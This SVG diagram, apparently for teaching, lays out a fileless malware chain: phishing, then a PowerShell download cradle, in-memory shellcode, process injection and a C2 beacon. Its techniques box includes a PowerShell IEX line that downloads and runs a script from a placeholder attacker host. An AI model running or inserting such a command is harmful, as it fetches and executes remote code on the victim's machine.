<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 250" width="800" height="250">
  <defs>
    <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#555555"/>
    </marker>
  </defs>
  <rect width="800" height="250" fill="#0d0d0d"/>
  <text x="16" y="22" font-family="Courier New, monospace" font-size="13" font-weight="bold" fill="#e0e0e0">Fileless Execution Chain — Nothing Touches Disk</text>

  <!-- Initial delivery -->
  <rect x="20" y="80" width="120" height="50" fill="#161616" stroke="#ff4444" stroke-width="1.5" rx="2"/>
  <text x="80" y="100" font-family="Courier New, monospace" font-size="10" fill="#ff4444" text-anchor="middle">PHISH / EXPLOIT</text>
  <text x="80" y="115" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">macro / link / CVE</text>

  <!-- PowerShell in memory -->
  <rect x="195" y="80" width="130" height="50" fill="#161616" stroke="#00b3cc" stroke-width="1.5" rx="2"/>
  <text x="260" y="100" font-family="Courier New, monospace" font-size="10" fill="#00b3cc" text-anchor="middle">POWERSHELL</text>
  <text x="260" y="115" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">IEX download cradle</text>

  <!-- In-memory payload -->
  <rect x="380" y="80" width="130" height="50" fill="#161616" stroke="#00c732" stroke-width="1.5" rx="2"/>
  <text x="445" y="100" font-family="Courier New, monospace" font-size="10" fill="#00c732" text-anchor="middle">IN-MEMORY</text>
  <text x="445" y="115" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">shellcode / assembly</text>

  <!-- Process injection -->
  <rect x="565" y="80" width="130" height="50" fill="#161616" stroke="#00c732" stroke-width="1.5" rx="2"/>
  <text x="630" y="100" font-family="Courier New, monospace" font-size="10" fill="#00c732" text-anchor="middle">PROC INJECTION</text>
  <text x="630" y="115" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">reflective DLL / hollow</text>

  <!-- No disk indicator -->
  <rect x="700" y="68" width="85" height="74" fill="#161616" stroke="#ffcc00" stroke-width="1.5" rx="2"/>
  <text x="742" y="100" font-family="Courier New, monospace" font-size="10" fill="#ffcc00" text-anchor="middle">C2 BEACON</text>
  <text x="742" y="113" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">no files on</text>
  <text x="742" y="126" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">disk</text>

  <!-- Arrows -->
  <line x1="140" y1="105" x2="195" y2="105" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <line x1="325" y1="105" x2="380" y2="105" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <line x1="510" y1="105" x2="565" y2="105" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <line x1="695" y1="105" x2="700" y2="105" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>

  <!-- Techniques box -->
  <rect x="20" y="155" width="760" height="70" fill="#0d1a0d" stroke="#1e3a1e" rx="2"/>
  <text x="30" y="172" font-family="Courier New, monospace" font-size="10" fill="#666666">Common fileless techniques:</text>
  <text x="30" y="187" font-family="Courier New, monospace" font-size="10" fill="#444444">  IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')  — download &amp; execute in memory</text>
  <text x="30" y="202" font-family="Courier New, monospace" font-size="10" fill="#444444">  Process hollowing: spawn suspended process → overwrite with shellcode → resume</text>
  <text x="30" y="217" font-family="Courier New, monospace" font-size="10" fill="#444444">  Reflective DLL injection: self-loading PE mapped into process memory</text>
</svg>
